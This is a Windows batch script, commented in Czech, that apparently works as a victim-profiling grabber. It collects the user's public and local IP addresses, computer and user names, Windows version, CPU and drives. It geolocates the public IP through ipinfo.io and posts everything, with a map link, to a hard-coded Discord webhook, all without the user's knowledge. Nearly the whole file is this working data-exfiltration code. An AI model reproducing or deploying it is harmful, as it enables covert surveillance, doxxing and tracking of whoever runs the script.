@echo off
for /f "tokens=2 delims=: " %%A in ('nslookup myip.opendns.com resolver1.opendns.com ^| find "Address:"') do set IP=%%A
for /f "tokens=2 delims=: " %%A in ('ipconfig ^| find "IPv4 Address"') do set LOCAL_IP=%%A
set PC_NAME=%COMPUTERNAME%
set USER_NAME=%USERNAME%
for /f "tokens=2 delims==" %%A in ('wmic os get caption /value') do set WIN_VERSION=%%A
for /f "tokens=2 delims==" %%A in ('wmic cpu get caption /value') do set CPU=%%A
for /f "tokens=2 delims=:" %%A in ('wmic logicaldisk get caption') do set DISK=%%A
for /f "tokens=2 delims=:," %%A in ('curl -s https://ipinfo.io/%IP%/json ^| findstr "city"') do set CITY=%%A
for /f "tokens=2 delims=:," %%A in ('curl -s https://ipinfo.io/%IP%/json ^| findstr "region"') do set REGION=%%A
for /f "tokens=2 delims=:," %%A in ('curl -s https://ipinfo.io/%IP%/json ^| findstr "country"') do set COUNTRY=%%A

:: Odstranění diakritiky
setlocal EnableDelayedExpansion
set IP=!IP:á=a!
set IP=!IP:é=e!
set IP=!IP:í=i!
set IP=!IP:ó=o!
set IP=!IP:ú=u!
set IP=!IP:ý=y!
set IP=!IP:č=c!
set IP=!IP:ř=r!
set IP=!IP:š=s!
set IP=!IP:ž=z!
set IP=!IP:ď=d!
set IP=!IP:ť=t!
set IP=!IP:ň=n!
set IP=!IP:ů=u!
set IP=!IP:ě=e!
set IP=!IP:ř=r!

set CITY=!CITY:á=a!
set CITY=!CITY:é=e!
set CITY=!CITY:í=i!
set CITY=!CITY:ó=o!
set CITY=!CITY:ú=u!
set CITY=!CITY:ý=y!
set CITY=!CITY:č=c!
set CITY=!CITY:ř=r!
set CITY=!CITY:š=s!
set CITY=!CITY:ž=z!
set CITY=!CITY:ď=d!
set CITY=!CITY:ť=t!
set CITY=!CITY:ň=n!
set CITY=!CITY:ů=u!
set CITY=!CITY:ě=e!

set REGION=!REGION:á=a!
set REGION=!REGION:é=e!
set REGION=!REGION:í=i!
set REGION=!REGION:ó=o!
set REGION=!REGION:ú=u!
set REGION=!REGION:ý=y!
set REGION=!REGION:č=c!
set REGION=!REGION:ř=r!
set REGION=!REGION:š=s!
set REGION=!REGION:ž=z!
set REGION=!REGION:ď=d!
set REGION=!REGION:ť=t!
set REGION=!REGION:ň=n!
set REGION=!REGION:ů=u!
set REGION=!REGION:ě=e!

set COUNTRY=!COUNTRY:á=a!
set COUNTRY=!COUNTRY:é=e!
set COUNTRY=!COUNTRY:í=i!
set COUNTRY=!COUNTRY:ó=o!
set COUNTRY=!COUNTRY:ú=u!
set COUNTRY=!COUNTRY:ý=y!
set COUNTRY=!COUNTRY:č=c!
set COUNTRY=!COUNTRY:ř=r!
set COUNTRY=!COUNTRY:š=s!
set COUNTRY=!COUNTRY:ž=z!
set COUNTRY=!COUNTRY:ď=d!
set COUNTRY=!COUNTRY:ť=t!
set COUNTRY=!COUNTRY:ň=n!
set COUNTRY=!COUNTRY:ů=u!
set COUNTRY=!COUNTRY:ě=e!

set MAP_URL=https://www.google.com/maps?q=!CITY!,!REGION!,!COUNTRY!

curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"Verejna IP: %IP%\nLokalni IP: %LOCAL_IP%\nPocitac: %PC_NAME%\nUzivatel: %USER_NAME%\nWindows: %WIN_VERSION%\nCPU: %CPU%\nDisk: %DISK%\nMesto: !CITY!\nRegion: !REGION!\nZeme: !COUNTRY!\nOdkaz na mapy: !MAP_URL!\"}" "https://discordapp.com/api/webhooks/1356655194666045492/aRZhNAvhI2VBFl-m0ytbNf8su-y6G7LsqONVGI1sTN42O2cYTsZQtqA8DaR2aFUDjUkN"
